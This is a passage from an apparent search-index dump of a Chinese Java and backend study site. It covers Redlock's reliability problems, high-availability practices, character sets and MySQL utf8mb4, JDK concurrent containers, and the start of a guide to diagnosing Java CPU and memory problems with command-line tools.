的方式，并且怎么修改 Redlock 算法使其能产生 fencing token 呢？好像并不那么显而易见。因为产生 token 需要单调递增，除非在单节点 Redis 上完成但是这又没有高可靠性，你好像需要引进一致性协议来让 Redlock 产生可靠的 fencing token。\n使用时间来解决一致性    Redlock 无法产生 fencing token 早该成为在需求正确性的场景下弃用它的理由，但还有一些值得讨论的地方。\n学术界有个说法，算法对时间不做假设：因为进程可能pause一段时间、数据包可能因为网络延迟延后到达、时钟可能根本就是错的。而可靠的算法依旧要在上述假设下做正确的事情。\n对于 failure detector 来说，timeout 只能作为猜测某个节点 fail 的依据，因为网络延迟、本地时钟不正确等其他原因的限制。考虑到 Redis 使用 gettimeofday，而不是单调的时钟，会受到系统时间的影响，可能会突然前进或者后退一段时间，这会导致一个 key 更快或更慢地过期。\n可见，Redlock 依赖于许多时间假设，它假设所有 Redis 节点都能对同一个 Key 在其过期前持有差不多的时间、跟过期时间相比网络延迟很小、跟过期时间相比进程 pause 很短。\n用不可靠的时间打破 Redlock    这节 Martin 举了个因为时间问题，Redlock 不可靠的例子。\n client1 从 ABC 三个节点处申请到锁，DE由于网络原因请求没有到达 C节点的时钟往前推了，导致 lock 过期 client2 在CDE处获得了锁，AB由于网络原因请求未到达 此时 client1 和 client2 都获得了锁  在 Redlock 官方文档中也提到了这个情况，不过是C崩溃的时候，Redlock 官方本身也是知道 Redlock 算法不是完全可靠的，官方为了解决这种问题建议使用延时启动，相关内容可以看之前的这篇文章。但是 Martin 这里分析得更加全面，指出延时启动不也是依赖于时钟的正确性的么？\n接下来 Martin 又列举了进程 Pause 时而不是时钟不可靠时会发生的问题：\n client1 从 ABCDE 处获得了锁 当获得锁的 response 还没到达 client1 时 client1 进入 GC 停顿 停顿期间锁已经过期了 client2 在 ABCDE 处获得了锁 client1 GC 完成收到了获得锁的 response，此时两个 client 又拿到了同一把锁  同时长时间的网络延迟也有可能导致同样的问题。\nRedlock 的同步性假设    这些例子说明了，仅有在你假设了一个同步性系统模型的基础上，Redlock 才能正常工作，也就是系统能满足以下属性：\n 网络延时边界，即假设数据包一定能在某个最大延时之内到达 进程停顿边界，即进程停顿一定在某个最大时间之内 时钟错误边界，即不会从一个坏的 NTP 服务器处取得时间  结论    Martin 认为 Redlock 实在不是一个好的选择，对于需求性能的分布式锁应用它太重了且成本高；对于需求正确性的应用来说它不够安全。因为它对高危的时钟或者说其他上述列举的情况进行了不可靠的假设，如果你的应用只需要高性能的分布式锁不要求多高的正确性，那么单节点 Redis 够了；如果你的应用想要保住正确性，那么不建议 Redlock，建议使用一个合适的一致性协调系统，例如 Zookeeper，且保证存在 fencing token。\n"},{"id":342,"href":"/system-design/high-availability/%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E9%AB%98%E5%8F%AF%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%A6%81%E8%80%83%E8%99%91%E5%93%AA%E4%BA%9B%E5%9C%B0%E6%96%B9/","title":"如何设计一个高可用系统要考虑哪些地方","parent":"high-availability","content":"一篇短小的文章，面试经常遇到的这个问题。本文主要包括下面这些内容：\n 高可用的定义 哪些情况可能会导致系统不可用？ 有哪些提高系统可用性的方法？只是简单的提一嘴，更具体内容在后续的文章中介绍，就拿限流来说，你需要搞懂：何为限流？如何限流？为什么要限流？如何做呢？说一下原理？。  什么是高可用？可用性的判断标准是啥？    高可用描述的是一个系统在大部分时间都是可用的，可以为我们提供服务的。高可用代表系统即使在发生硬件故障或者系统升级的时候，服务仍然是可用的。\n一般情况下，我们使用多少个 9 来评判一个系统的可用性，比如 99.9999% 就是代表该系统在所有的运行时间中只有 0.0001% 的时间是不可用的，这样的系统就是非常非常高可用的了！当然，也会有系统如果可用性不太好的话，可能连 9 都上不了。\n除此之外，系统的可用性还可以用某功能的失败次数与总的请求次数之比来衡量，比如对网站请求 1000 次，其中有 10 次请求失败，那么可用性就是 99%。\n哪些情况会导致系统不可用？     黑客攻击； 硬件故障，比如服务器坏掉。 并发量/用户请求量激增导致整个服务宕掉或者部分服务不可用。 代码中的坏味道导致内存泄漏或者其他问题导致程序挂掉。 网站架构某个重要的角色比如 Nginx 或者数据库突然不可用。 自然灾害或者人为破坏。 \u0026hellip;\u0026hellip;  有哪些提高系统可用性的方法？    1. 注重代码质量，测试严格把关    我觉得这个是最最最重要的，代码质量有问题比如比较常见的内存泄漏、循环依赖都是对系统可用性极大的损害。大家都喜欢谈限流、降级、熔断，但是我觉得从代码质量这个源头把关是首先要做好的一件很重要的事情。如何提高代码质量？比较实际可用的就是 CodeReview，不要在乎每天多花的那 1 个小时左右的时间，作用可大着呢！\n另外，安利这个对提高代码质量有实际效果的宝贝：\n sonarqube ：保证你写出更安全更干净的代码！（ps: 目前所在的项目基本都会用到这个插件）。 Alibaba 开源的 Java 诊断工具 Arthas 也是很不错的选择。 IDEA 自带的代码分析等工具进行代码扫描也是非常非常棒的。  2.使用集群，减少单点故障    先拿常用的 Redis 举个例子！我们如何保证我们的 Redis 缓存高可用呢？答案就是使用集群，避免单点故障。当我们使用一个 Redis 实例作为缓存的时候，这个 Redis 实例挂了之后，整个缓存服务可能就挂了。使用了集群之后，即使一台 Redis 实例挂了，不到一秒就会有另外一台 Redis 实例顶上。\n3.限流    流量控制（flow control），其原理是监控应用流量的 QPS 或并发线程数等指标，当达到指定的阈值时对流量进行控制，以避免被瞬时的流量高峰冲垮，从而保障应用的高可用性。——来自 alibaba-Sentinel 的 wiki。\n4.超时和重试机制设置    一旦用户请求超过某个时间的得不到响应，就抛出异常。这个是非常重要的，很多线上系统故障都是因为没有进行超时设置或者超时设置的方式不对导致的。我们在读取第三方服务的时候，尤其适合设置超时和重试机制。一般我们使用一些 RPC 框架的时候，这些框架都自带的超时重试的配置。如果不进行超时设置可能会导致请求响应速度慢，甚至导致请求堆积进而让系统无法再处理请求。重试的次数一般设为 3 次，再多次的重试没有好处，反而会加重服务器压力（部分场景使用失败重试机制会不太适合）。\n5.熔断机制    超时和重试机制设置之外，熔断机制也是很重要的。 熔断机制说的是系统自动收集所依赖服务的资源使用情况和性能指标，当所依赖的服务恶化或者调用失败次数达到某个阈值的时候就迅速失败，让当前系统立即切换依赖其他备用服务。 比较常用的流量控制和熔断降级框架是 Netflix 的 Hystrix 和 alibaba 的 Sentinel。\n6.异步调用    异步调用的话我们不需要关心最后的结果，这样我们就可以用户请求完成之后就立即返回结果，具体处理我们可以后续再做，秒杀场景用这个还是蛮多的。但是，使用异步之后我们可能需要 适当修改业务流程进行配合，比如用户在提交订单之后，不能立即返回用户订单提交成功，需要在消息队列的订单消费者进程真正处理完该订单之后，甚至出库后，再通过电子邮件或短信通知用户订单成功。除了可以在程序中实现异步之外，我们常常还使用消息队列，消息队列可以通过异步处理提高系统性能（削峰、减少响应所需时间）并且可以降低系统耦合性。\n7.使用缓存    如果我们的系统属于并发量比较高的话，如果我们单纯使用数据库的话，当大量请求直接落到数据库可能数据库就会直接挂掉。使用缓存缓存热点数据，因为缓存存储在内存中，所以速度相当地快！\n8.其他     核心应用和服务优先使用更好的硬件 监控系统资源使用情况增加报警设置。 注意备份，必要时候回滚。 灰度发布： 将服务器集群分成若干部分，每天只发布一部分机器，观察运行稳定没有故障，第二天继续发布一部分机器，持续几天才把整个集群全部发布完毕，期间如果发现问题，只需要回滚已发布的一部分服务器即可 定期检查/更换硬件： 如果不是购买的云服务的话，定期还是需要对硬件进行一波检查的，对于一些需要更换或者升级的硬件，要及时更换或者升级。 \u0026hellip;..(想起来再补充！也欢迎各位欢迎补充！)  总结    "},{"id":343,"href":"/database/%E5%AD%97%E7%AC%A6%E9%9B%86/","title":"字符集","parent":"database","content":"MySQL 字符编码集中有两套 UTF-8 编码实现：utf8 和 utf8mb4。\n如果使用 utf8 的话，存储emoji 符号和一些比较复杂的汉字、繁体字就会出错。\n为什么会这样呢？这篇文章可以从源头给你解答。\n何为字符集？    字符是各种文字和符号的统称，包括各个国家文字、标点符号、表情、数字等等。 字符集 就是一系列字符的集合。字符集的种类较多，每个字符集可以表示的字符范围通常不同，就比如说有些字符集是无法表示汉字的。\n计算机只能存储二进制的数据，那英文、汉字、表情等字符应该如何存储呢？\n我们要将这些字符和二级制的数据一一对应起来，比如说字符“a”对应“01100001”，反之，“01100001”对应 “a”。我们将字符对应二进制数据的过程称为\u0026quot;字符编码\u0026quot;，反之，二进制数据解析成字符的过程称为“字符解码”。\n有哪些常见的字符集？    常见的字符集有 ASCII、GB2312、GBK、UTF-8\u0026hellip;\u0026hellip;。\n不同的字符集的主要区别在于：\n 可以表示的字符范围 编码方式  ASCII    ASCII (American Standard Code for Information Interchange，美国信息交换标准代码) 是一套主要用于现代美国英语的字符集（这也是 ASCII 字符集的局限性所在）。\n为什么 ASCII 字符集没有考虑到中文等其他字符呢？ 因为计算机是美国人发明的，当时，计算机的发展还处于比较雏形的时代，还未在其他国家大规模使用。因此，美国发布 ASCII 字符集的时候没有考虑兼容其他国家的语言。\nASCII 字符集至今为止共定义了 128 个字符，其中有 33 个控制字符（比如回车、删除）无法显示。\n一个 ASCII 码长度是一个字节也就是 8 个 bit，比如“a”对应的 ASCII 码是“01100001”。不过，最高位是 0 仅仅作为校验位，其余 7 位使用 0 和 1 进行组合，所以，ASCII 字符集可以定义 128（2^7）个字符。\n由于，ASCII 码可以表示的字符实在是太少了。后来，人们对其进行了扩展得到了 ASCII 扩展字符集 。ASCII 扩展字符集使用 8 位（bits）表示一个字符，所以，ASCII 扩展字符集可以定义 256（2^8）个字符。\nGB2312    我们上面说了，ASCII 字符集是一种现代美国英语适用的字符集。因此，很多国家都捣鼓了一个适合自己国家语言的字符集。\nGB2312 字符集是一种对汉字比较友好的字符集，共收录 6700 多个汉字，基本涵盖了绝大部分常用汉字。不过，GB2312 字符集不支持绝大部分的生僻字和繁体字。\n对于英语字符，GB2312 编码和 ASCII 码是相同的，1 字节编码即可。对于非英字符，需要 2 字节编码。\nGBK    GBK 字符集可以看作是 GB2312 字符集的扩展，兼容 GB2312 字符集，共收录了 20000 多个汉字。\nGBK 中 K 是汉语拼音 Kuo Zhan（扩展）中的“Kuo”的首字母。\nGB18030    GB18030 完全兼容 GB2312 和 GBK 字符集，纳入中国国内少数民族的文字，且收录了日韩汉字，是目前为止最全面的汉字字符集，共收录汉字 70000 多个。\nBIG5    BIG5 主要针对的是繁体中文，收录了 13000 多个汉字。\nUnicode \u0026amp; UTF-8编码    为了更加适合本国语言，诞生了很多种字符集。\n我们上面也说了不同的字符集可以表示的字符范围以及编码规则存在差异。这就导致了一个非常严重的问题：使用错误的编码方式查看一个包含字符的文件就会产生乱码现象。\n就比如说你使用 UTF-8 编码方式打开 GB2312 编码格式的文件就会出现乱码。示例：“牛”这个汉字 GB2312 编码后的十六进制数值为 “C5A3”，而 “C5A3” 用 UTF-8 解码之后得到的却是 “ţ”。\n你可以通过这个网站在线进行编码和解码：https://www.haomeili.net/HanZi/ZiFuBianMaZhuanHuan\n这样我们就搞懂了乱码的本质： 编码和解码时用了不同或者不兼容的字符集 。\n为了解决这个问题，人们就想：“如果我们能够有一种字符集将世界上所有的字符都纳入其中就好了！”。\n然后，Unicode 带着这个使命诞生了。\nUnicode 字符集中包含了世界上几乎所有已知的字符。不过，Unicode 字符集并没有规定如何存储这些字符（也就是如何使用二进制数据表示这些字符）。\n然后，就有了 UTF-8（8-bit Unicode Transformation Format）。类似的还有 UTF-16、 UTF-32。\nUTF-8 使用 1 到 4 个字节为每个字符编码， UTF-16 使用 2 或 4 个字节为每个字符编码，UTF-32 固定位 4 个字节为每个字符编码。\nUTF-8 可以根据不同的符号自动选择编码的长短，像英文字符只需要 1 个字节就够了，这一点 ASCII 字符集一样 。因此，对于英语字符，UTF-8 编码和 ASCII 码是相同的。\nUTF-32 的规则最简单，不过缺陷也比较明显，对于英文字母这类字符消耗的空间是 UTF-8 的 4 倍之多。\nUTF-8 是目前使用最广的一种字符编码，。\nMySQL 字符集    MySQL 支持很多种字符编码的方式，比如 UTF-8、GB2312、GBK、BIG5。\n你可以通过 SHOW CHARSET 命令来查看。\n通常情况下，我们建议使用 UTF-8 作为默认的字符编码方式。\n不过，这里有一个小坑。\nMySQL 字符编码集中有两套 UTF-8 编码实现：\n utf8 ： utf8编码只支持1-3个字节 。 在 utf8 编码中，中文是占 3 个字节，其他数字、英文、符号占一个字节。但 emoji 符号占 4 个字节，一些较复杂的文字、繁体字也是 4 个字节。 utf8mb4 ： UTF-8 的完整实现，正版！最多支持使用 4 个字节表示字符，因此，可以用来存储 emoji 符号。  为什么有两套 UTF-8 编码实现呢？ 原因如下：\n因此，如果你需要存储emoji类型的数据或者一些比较复杂的文字、繁体字到 MySQL 数据库的话，数据库的编码一定要指定为utf8mb4 而不是utf8 ，要不然存储的时候就会报错了。\n演示一下吧！（环境：MySQL 5.7+）\n建表语句如下，我们指定数据库 CHARSET 为 utf8 。\nCREATE TABLE `user` ( `id` varchar(66) CHARACTER SET utf8mb4 NOT NULL, `name` varchar(33) CHARACTER SET utf8mb4 NOT NULL, `phone` varchar(33) CHARACTER SET utf8mb4 DEFAULT NULL, `password` varchar(100) CHARACTER SET utf8mb4 DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8; 当我们执行下面的 insert 语句插入数据到数据库时，果然报错！\nINSERT INTO `user` (`id`, `name`, `phone`, `password`) VALUES (\u0026#39;A00003\u0026#39;, \u0026#39;guide哥😘😘😘\u0026#39;, \u0026#39;181631312312\u0026#39;, \u0026#39;123456\u0026#39;); 报错信息如下：\nIncorrect string value: '\\xF0\\x9F\\x98\\x98\\xF0\\x9F...' for column 'name' at row 1 参考     字符集和字符编码（Charset \u0026amp; Encoding）： https://www.cnblogs.com/skynet/archive/2011/05/03/2035105.html 十分钟搞清字符集和字符编码：http://cenalulu.github.io/linux/character-encoding/ Unicode-维基百科：https://zh.wikipedia.org/wiki/Unicode GB2312-维基百科：https://zh.wikipedia.org/wiki/GB_2312 UTF-8-维基百科：https://zh.wikipedia.org/wiki/UTF-8 GB18030-维基百科: https://zh.wikipedia.org/wiki/GB_18030  "},{"id":344,"href":"/java/multi-thread/%E5%B9%B6%E5%8F%91%E5%AE%B9%E5%99%A8%E6%80%BB%E7%BB%93/","title":"并发容器总结","parent":"multi-thread","content":"JDK 提供的并发容器总结    JDK 提供的这些容器大部分在 java.util.concurrent 包中。\n ConcurrentHashMap : 线程安全的 HashMap CopyOnWriteArrayList : 线程安全的 List，在读多写少的场合性能非常好，远远好于 Vector。 ConcurrentLinkedQueue : 高效的并发队列，使用链表实现。可以看做一个线程安全的 LinkedList，这是一个非阻塞队列。 BlockingQueue : 这是一个接口，JDK 内部通过链表、数组等方式实现了这个接口。表示阻塞队列，非常适合用于作为数据共享的通道。 ConcurrentSkipListMap : 跳表的实现。这是一个 Map，使用跳表的数据结构进行快速查找。  ConcurrentHashMap    我们知道 HashMap 不是线程安全的，在并发场景下如果要保证一种可行的方式是使用 Collections.synchronizedMap() 方法来包装我们的 HashMap。但这是通过使用一个全局的锁来同步不同线程间的并发访问，因此会带来不可忽视的性能问题。\n所以就有了 HashMap 的线程安全版本—— ConcurrentHashMap 的诞生。\n在 ConcurrentHashMap 中，无论是读操作还是写操作都能保证很高的性能：在进行读操作时(几乎)不需要加锁，而在写操作时通过锁分段技术只对所操作的段加锁而不影响客户端对其它段的访问。\nCopyOnWriteArrayList    CopyOnWriteArrayList 简介    public class CopyOnWriteArrayList\u0026lt;E\u0026gt; extends Object implements List\u0026lt;E\u0026gt;, RandomAccess, Cloneable, Serializable 在很多应用场景中，读操作可能会远远大于写操作。由于读操作根本不会修改原有的数据，因此对于每次读取都进行加锁其实是一种资源浪费。我们应该允许多个线程同时访问 List 的内部数据，毕竟读取操作是安全的。\n这和我们之前在多线程章节讲过 ReentrantReadWriteLock 读写锁的思想非常类似，也就是读读共享、写写互斥、读写互斥、写读互斥。JDK 中提供了 CopyOnWriteArrayList 类比相比于在读写锁的思想又更进一步。为了将读取的性能发挥到极致，CopyOnWriteArrayList 读取是完全不用加锁的，并且更厉害的是：写入也不会阻塞读取操作。只有写入和写入之间需要进行同步等待。这样一来，读操作的性能就会大幅度提升。那它是怎么做的呢？\nCopyOnWriteArrayList 是如何做到的？    CopyOnWriteArrayList 类的所有可变操作（add，set 等等）都是通过创建底层数组的新副本来实现的。当 List 需要被修改的时候，我并不修改原有内容，而是对原有数据进行一次复制，将修改的内容写入副本。写完之后，再将修改完的副本替换原来的数据，这样就可以保证写操作不会影响读操作了。\n从 CopyOnWriteArrayList 的名字就能看出 CopyOnWriteArrayList 是满足 CopyOnWrite 的。所谓 CopyOnWrite 也就是说：在计算机，如果你想要对一块内存进行修改时，我们不在原有内存块中进行写操作，而是将内存拷贝一份，在新的内存中进行写操作，写完之后呢，就将指向原来内存指针指向新的内存，原来的内存就可以被回收掉了。\nCopyOnWriteArrayList 读取和写入源码简单分析    CopyOnWriteArrayList 读取操作的实现    读取操作没有任何同步控制和锁操作，理由就是内部数组 array 不会发生修改，只会被另外一个 array 替换，因此可以保证数据安全。\n/** The array, accessed only via getArray/setArray. */ private transient volatile Object[] array; public E get(int index) { return get(getArray(), index); } @SuppressWarnings(\u0026#34;unchecked\u0026#34;) private E get(Object[] a, int index) { return (E) a[index]; } final Object[] getArray() { return array; } 3.3.2 CopyOnWriteArrayList 写入操作的实现    CopyOnWriteArrayList 写入操作 add()方法在添加集合的时候加了锁，保证了同步，避免了多线程写的时候会 copy 出多个副本出来。\n/** * Appends the specified element to the end of this list. * * @param e element to be appended to this list * @return {@code true} (as specified by {@link Collection#add}) */ public boolean add(E e) { final ReentrantLock lock = this.lock; lock.lock();//加锁  try { Object[] elements = getArray(); int len = elements.length; Object[] newElements = Arrays.copyOf(elements, len + 1);//拷贝新数组  newElements[len] = e; setArray(newElements); return true; } finally { lock.unlock();//释放锁  } } ConcurrentLinkedQueue    Java 提供的线程安全的 Queue 可以分为阻塞队列和非阻塞队列，其中阻塞队列的典型例子是 BlockingQueue，非阻塞队列的典型例子是 ConcurrentLinkedQueue，在实际应用中要根据实际需要选用阻塞队列或者非阻塞队列。 阻塞队列可以通过加锁来实现，非阻塞队列可以通过 CAS 操作实现。\n从名字可以看出，ConcurrentLinkedQueue这个队列使用链表作为其数据结构．ConcurrentLinkedQueue 应该算是在高并发环境中性能最好的队列了。它之所有能有很好的性能，是因为其内部复杂的实现。\nConcurrentLinkedQueue 内部代码我们就不分析了，大家知道 ConcurrentLinkedQueue 主要使用 CAS 非阻塞算法来实现线程安全就好了。\nConcurrentLinkedQueue 适合在对性能要求相对较高，同时对队列的读写存在多个线程同时进行的场景，即如果对队列加锁的成本较高则适合使用无锁的 ConcurrentLinkedQueue 来替代。\nBlockingQueue    BlockingQueue 简介    上面我们己经提到了 ConcurrentLinkedQueue 作为高性能的非阻塞队列。下面我们要讲到的是阻塞队列——BlockingQueue。阻塞队列（BlockingQueue）被广泛使用在“生产者-消费者”问题中，其原因是 BlockingQueue 提供了可阻塞的插入和移除的方法。当队列容器已满，生产者线程会被阻塞，直到队列未满；当队列容器为空时，消费者线程会被阻塞，直至队列非空时为止。\nBlockingQueue 是一个接口，继承自 Queue，所以其实现类也可以作为 Queue 的实现来使用，而 Queue 又继承自 Collection 接口。下面是 BlockingQueue 的相关实现类：\n下面主要介绍一下 3 个常见的 BlockingQueue 的实现类：ArrayBlockingQueue、LinkedBlockingQueue 、PriorityBlockingQueue 。\nArrayBlockingQueue    ArrayBlockingQueue 是 BlockingQueue 接口的有界队列实现类，底层采用数组来实现。\npublic class ArrayBlockingQueue\u0026lt;E\u0026gt; extends AbstractQueue\u0026lt;E\u0026gt; implements BlockingQueue\u0026lt;E\u0026gt;, Serializable{} ArrayBlockingQueue 一旦创建，容量不能改变。其并发控制采用可重入锁 ReentrantLock ，不管是插入操作还是读取操作，都需要获取到锁才能进行操作。当队列容量满时，尝试将元素放入队列将导致操作阻塞;尝试从一个空队列中取一个元素也会同样阻塞。\nArrayBlockingQueue 默认情况下不能保证线程访问队列的公平性，所谓公平性是指严格按照线程等待的绝对时间顺序，即最先等待的线程能够最先访问到 ArrayBlockingQueue。而非公平性则是指访问 ArrayBlockingQueue 的顺序不是遵守严格的时间顺序，有可能存在，当 ArrayBlockingQueue 可以被访问时，长时间阻塞的线程依然无法访问到 ArrayBlockingQueue。如果保证公平性，通常会降低吞吐量。如果需要获得公平性的 ArrayBlockingQueue，可采用如下代码：\nprivate static ArrayBlockingQueue\u0026lt;Integer\u0026gt; blockingQueue = new ArrayBlockingQueue\u0026lt;Integer\u0026gt;(10,true); LinkedBlockingQueue    LinkedBlockingQueue 底层基于单向链表实现的阻塞队列，可以当做无界队列也可以当做有界队列来使用，同样满足 FIFO 的特性，与 ArrayBlockingQueue 相比起来具有更高的吞吐量，为了防止 LinkedBlockingQueue 容量迅速增，损耗大量内存。通常在创建 LinkedBlockingQueue 对象时，会指定其大小，如果未指定，容量等于 Integer.MAX_VALUE 。\n相关构造方法:\n/** *某种意义上的无界队列 * Creates a {@code LinkedBlockingQueue} with a capacity of * {@link Integer#MAX_VALUE}. */ public LinkedBlockingQueue() { this(Integer.MAX_VALUE); } /** *有界队列 * Creates a {@code LinkedBlockingQueue} with the given (fixed) capacity. * * @param capacity the capacity of this queue * @throws IllegalArgumentException if {@code capacity} is not greater * than zero */ public LinkedBlockingQueue(int capacity) { if (capacity \u0026lt;= 0) throw new IllegalArgumentException(); this.capacity = capacity; last = head = new Node\u0026lt;E\u0026gt;(null); } PriorityBlockingQueue    PriorityBlockingQueue 是一个支持优先级的无界阻塞队列。默认情况下元素采用自然顺序进行排序，也可以通过自定义类实现 compareTo() 方法来指定元素排序规则，或者初始化时通过构造器参数 Comparator 来指定排序规则。\nPriorityBlockingQueue 并发控制采用的是可重入锁 ReentrantLock，队列为无界队列（ArrayBlockingQueue 是有界队列，LinkedBlockingQueue 也可以通过在构造函数中传入 capacity 指定队列最大的容量，但是 PriorityBlockingQueue 只能指定初始的队列大小，后面插入元素的时候，如果空间不够的话会自动扩容）。\n简单地说，它就是 PriorityQueue 的线程安全版本。不可以插入 null 值，同时，插入队列的对象必须是可比较大小的（comparable），否则报 ClassCastException 异常。它的插入操作 put 方法不会 block，因为它是无界队列（take 方法在队列为空的时候会阻塞）。\n推荐文章： 《解读 Java 并发队列 BlockingQueue》\nConcurrentSkipListMap    下面这部分内容参考了极客时间专栏《数据结构与算法之美》以及《实战 Java 高并发程序设计》。\n为了引出 ConcurrentSkipListMap，先带着大家简单理解一下跳表。\n对于一个单链表，即使链表是有序的，如果我们想要在其中查找某个数据，也只能从头到尾遍历链表，这样效率自然就会很低，跳表就不一样了。跳表是一种可以用来快速查找的数据结构，有点类似于平衡树。它们都可以对元素进行快速的查找。但一个重要的区别是：对平衡树的插入和删除往往很可能导致平衡树进行一次全局的调整。而对跳表的插入和删除只需要对整个数据结构的局部进行操作即可。这样带来的好处是：在高并发的情况下，你会需要一个全局锁来保证整个平衡树的线程安全。而对于跳表，你只需要部分锁即可。这样，在高并发环境下，你就可以拥有更好的性能。而就查询的性能而言，跳表的时间复杂度也是 O(logn) 所以在并发数据结构中，JDK 使用跳表来实现一个 Map。\n跳表的本质是同时维护了多个链表，并且链表是分层的，\n最低层的链表维护了跳表内所有的元素，每上面一层链表都是下面一层的子集。\n跳表内的所有链表的元素都是排序的。查找时，可以从顶级链表开始找。一旦发现被查找的元素大于当前链表中的取值，就会转入下一层链表继续找。这也就是说在查找过程中，搜索是跳跃式的。如上图所示，在跳表中查找元素 18。\n查找 18 的时候原来需要遍历 18 次，现在只需要 7 次即可。针对链表长度比较大的时候，构建索引查找效率的提升就会非常明显。\n从上面很容易看出，跳表是一种利用空间换时间的算法。\n使用跳表实现 Map 和使用哈希算法实现 Map 的另外一个不同之处是：哈希并不会保存元素的顺序，而跳表内所有的元素都是排序的。因此在对跳表进行遍历时，你会得到一个有序的结果。所以，如果你的应用需要有序性，那么跳表就是你不二的选择。JDK 中实现这一数据结构的类是 ConcurrentSkipListMap。\n参考     《实战 Java 高并发程序设计》 https://javadoop.com/post/java-concurrent-queue https://juejin.im/post/5aeebd02518825672f19c546  "},{"id":345,"href":"/java/tips/locate-performance-problems/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%AE%9A%E4%BD%8D%E5%B8%B8%E8%A7%81Java%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98/","title":"手把手教你定位常见Java性能问题","parent":"locate-performance-problems","content":" 本文来自木木匠投稿。\n 手把手教你定位常见 Java 性能问题    概述    性能优化一向是后端服务优化的重点，但是线上性能故障问题不是经常出现，或者受限于业务产品，根本就没办法出现性能问题，包括笔者自己遇到的性能问题也不多，所以为了提前储备知识，当出现问题的时候不会手忙脚乱，我们本篇文章来模拟下常见的几个 Java 性能故障，来学习怎么去分析和定位。\n预备知识    既然是定位问题，肯定是需要借助工具，我们先了解下需要哪些工具可以帮忙定位问题。\ntop 命令\ntop命令使我们最常用的 Linux 命令之一，它可以实时的显示当前正在执行的进程的 CPU 使用率，内存使用率等系统信息。top -Hp pid 可以查看线程的系统资源使用情况。\nvmstat 命令\nvmstat 是一个指定周期和采集次数的虚拟内存检测工具，可以统计内存，CPU，swap 的使用情况，它还有一个重要的常用功能，用来观察进程的上下文切换。字段说明如下:\n  r: 运行队列中进程数量（当数量大于 CPU 核数表示有阻塞的线程）\n  b: 等待 IO 的进程数量\n  swpd: 使用虚拟内存大小\n  free: 空闲物理内存大小\n  buff: 用作缓冲的内存大小(内存和硬盘的缓冲区)\n  cache: 用作缓存的内存大小（CPU 和内存之间的缓冲区）\n  si: 每秒从交换区写到内存的大小，由磁盘调入内存\n  so: 每秒写入交换区的内存大小，由内存调入磁盘\n  bi: 每秒读取的块数\n  bo: 每秒写入的块数\n  in: 每秒中断数，包括时钟中断。\n  cs: 每秒上下文切换数。\n  us: 用户进程执行时间百分比(user time)\n  sy: 内核系统进程执行时间百分比(system time)\n  wa: IO 等待时间百分比\n  id: 空闲时间百分比\npidstat 命令\n  pidstat 是 Sysstat 中的一个组件，也是一款功能强大的性能监测工具，top 和 vmstat 两个命令都是监测进程的内存、CPU 以及 I/O 使用情况，而 pidstat 命令可以检测到线程级别的。pidstat命令线程切换字段说明如下：\n  UID ：被监控任务的真实用户 ID。\n  TGID ：线程组 ID。\n  TID：线程 ID。\n  cswch/s：主动切换上下文次数，这里是因为资源阻塞而切换线程，比如锁等待等情况。\n  nvcswch/s：被动切换上下文次数，这里指 CPU 调度切换了线程。\njstack 命令\n  jstack 是 JDK 工具命令，它是一种线程堆栈分析工具，最常用的功能就是使用 jstack pid 命令查看线程的堆栈信息，也经常用来排除死锁情况。\njstat 命令\n它可以检测 Java 程序运行的实时情况，包括堆内存信息和垃圾回收信息，我们常常用来查看程序垃圾回收情况。常用的命令是jstat -gc pid。信息字段说明如下：\n  S0C：年轻代中 To Survivor 的容量（单位 KB）；\n  S1C：年轻代中 From Survivor 的容量（单位 KB）；\n  S0U：年轻代中 To Survivor 目前已使用空间（单位 KB）；\n  S1U：年轻代中 From Survivor 目前已使用空间（单位 KB）；\n  EC：年轻代中 Eden 的容量（单位 KB）；\n  EU：年轻代中 Eden 目前已使用空间（单位 KB）；\n  OC：老年代的容量（单位 KB）；\n  OU：老年代目前已使用空间（单位 KB）；\n  MC：元空间的容量（单位 KB）；\n  MU：元空间目前已使用空间（单位 KB）；\n  YGC：从应用程序启动到采样时年轻代中 gc 次数；\n  YGCT：从应用程序启动到采样时年轻代中 gc 所用时间 (s)；\n  FGC：从应用程序启动到采样时 老年代（Full Gc）gc 次数；\n  FGCT：从应用程序启动到采样时 老年代代（Full Gc）gc 所用时间 (s)；\n  GCT：从应用程序启动到采样时 gc 用的总时间 (s)。\njmap 命令\n  jmap 也是 JDK 工具命令，他可以查看堆内存的初始化信息以及堆内存的使用情况，还可以生成 dump 文件来进行详细分析。查看堆内存情况命令jmap -heap pid。\nmat 内存工具\nMAT(Memory Analyzer Tool)工具是 eclipse 的一个插件(MAT 也可以单独使用)，它分析大内存的 dump 文件时，可以非常直观的看到各个对象在堆空间中所占用的内存大小、类实例数量、对象引用关系、利用 OQL 对象查询，以及可以很方便的找出对象 GC Roots 的相关信息。\nidea 中也有这么一个插件，就是 JProfiler。\n相关阅读：《性能诊断利器 JProfiler 快速入门和最佳实践》\n模拟环境准备    基础环境 jdk1.8，采用 SpringBoot 框架来写几个接口来触发模拟场景，首先是模拟 CPU 占满情况\nCPU 占满    模拟 CPU 占满还是比较简单，直接写一个死循环计算消耗 CPU 即可。\n/** * 模拟CPU占满 */ @GetMapping(\u0026#34;/cpu/loop\u0026#34;) public void testCPULoop() throws InterruptedException { System.out.println(\u0026#34;请求cpu死循环\u0026#34;); Thread.currentThread().setName(\u0026#34;loop-thread-cpu\u0026#34;); int num = 0; while (true) { num++; if (num == Integer.MAX_VALUE) { System.out.println(\u0026#34;reset\u0026#34;); } num = 0; } } 请求接口地址测试curl localhost:8080/cpu/loop,发现 CPU 立马飙升到 100%\n通过执行top -Hp 32805 查看 Java 线程情况\n执行 printf '%x' 32826 获取 16 进制的线程 id，用于dump信息查询，结果为 803a。最后我们执行jstack 32805 |grep -A 20 803a来查看下详细的dump信息。\n这里dump信息直接定位出了问题方法以及代码行，这就定位出了 CPU 占满的问题。\n内存泄露    模拟内存泄漏借助了 ThreadLocal 对象来完成，ThreadLocal 是一个线程私有变量，可以绑定到线程上，在整个线程的生命周期都会存在，但是由于 ThreadLocal 的特殊性，ThreadLocal 是基于 ThreadLocalMap 实现的，ThreadLocalMap 的 Entry 继承 WeakReference，而 Entry 的 Key 是 WeakReference 的封装，换句话说 Key 就是弱引用，弱引用在下次 GC 